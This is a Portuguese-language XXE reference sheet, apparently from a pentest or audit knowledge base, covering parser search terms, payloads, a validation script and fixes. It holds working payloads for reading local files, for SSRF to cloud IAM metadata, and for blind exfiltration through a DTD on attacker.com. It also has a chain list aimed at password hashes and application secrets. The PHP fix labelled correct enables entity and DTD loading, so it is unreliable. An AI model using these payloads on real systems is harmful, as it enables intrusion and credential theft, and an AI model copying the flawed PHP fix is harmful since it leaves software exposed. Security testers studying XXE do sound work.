# XML External Entity (XXE)

**Tags:** #critico #xxe #xml #ssrf #lfi #exfiltracao
**OWASP:** A05:2021  Security Misconfiguration
**CVSS Base:** 8.6 (Alto)  9.8 (Crítico  com OOB exfiltração ou SSRF)

---

## 📖 O que é

XXE ocorre quando um parser XML aceita e processa **entidades externas** definidas pelo atacante no documento XML submetido. Pode levar à leitura de arquivos locais, SSRF e em certas condições RCE.

---

## 🔍 `grep_search` Táticas

```
DocumentBuilderFactory
SAXParserFactory
XMLReader
XMLInputFactory
XmlDocument
XmlReader
simplexml_load_string
simplexml_load_file
lxml.etree.parse
lxml.etree.fromstring
etree.parse
etree.fromstring
JAXB
XStream
libxml2
```

**O que verificar:** `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` está presente?

**Ausência** = vulnerabilidade crítica.

---

## 💣 Payloads de Exploração

### Básico  Leitura de Arquivo Local
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Windows
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE (pivô para rede interna)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
```

### XXE Cego  Out-of-Band via HTTP (OOB)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>&send;</data></root>
```

**evil.dtd no servidor do atacante:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

### XXE Cego  Exfiltração via Erro do Parser
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
```
 O conteúdo do arquivo aparece na mensagem de erro (se debug habilitado).

---

## 🎯 Content-Type Switching Attack

> Apps REST que aceitam `application/json` **e** `application/xml` podem expor um parser XML não configurado.

```bash
# Requisição original JSON
POST /api/data HTTP/1.1
Content-Type: application/json
{"name": "test"}

# Tentativa de XXE  trocar Content-Type
POST /api/data HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><name>&xxe;</name></data>
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_xxe.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/api/upload"

# Payload básico de detecção
PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>"""

HEADERS = {
    "Content-Type": "application/xml"
}

try:
    r = requests.post(f"{TARGET}{ENDPOINT}", data=PAYLOAD, headers=HEADERS, timeout=10)
    if "root:" in r.text or "nobody:" in r.text:
        print("[XXE CRÍTICO] Leitura de /etc/passwd confirmada!")
        print(f"  Conteúdo: {r.text[:500]}")
    elif r.status_code == 200:
        print(f"[possivelmente bloqueado] Status: {r.status_code}")
        print(f"  Response: {r.text[:200]}")
    else:
        print(f"[blocked] Status: {r.status_code}")
except Exception as e:
    print(f"[error] {e}")
```

---

## 🛡️ Correção

### Java  Desabilitar DTD/Entidades Externas

```java
//  CORRETO  DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Desabilitar completamente DOCTYPE
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Desabilitar entidades externas gerais
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// Desabilitar entidades externas de parâmetro (DTD externo)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder builder = dbf.newDocumentBuilder();
```

### Python  lxml seguro

```python
#  CORRETO  lxml com parser seguro
from lxml import etree

# Parser que rejeita entidades externas
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.fromstring(xml_data, parser)
```

### PHP  simplexml com libxml

```php
//  CORRETO
libxml_disable_entity_loader(true);  // <= PHP 8.0, habilitado por padrão desde 8.0
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
// LIBXML_NOENT substitui entidades mas com libxml_disable_entity_loader ativo é seguro
```

---

## 🔗 Chain Exploits

```
XXE  /etc/passwd  Enumeração de usuários do sistema
XXE  /etc/shadow  Hashes de senha  Brute force offline
XXE SSRF  http://169.254.169.254/  Credenciais IAM  Comprometimento AWS
XXE OOB  Exfiltração de .env  Secrets da aplicação completos
XXE  /proc/self/environ  Variáveis de ambiente com DATABASE_URL
XXE + SAXParserFactory sem configuração  Schema inteiro exposto
```

---

## 📌 Referências
- [[ssrf-server-side-request-forgery]]
- [[path-traversal-lfi]]
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
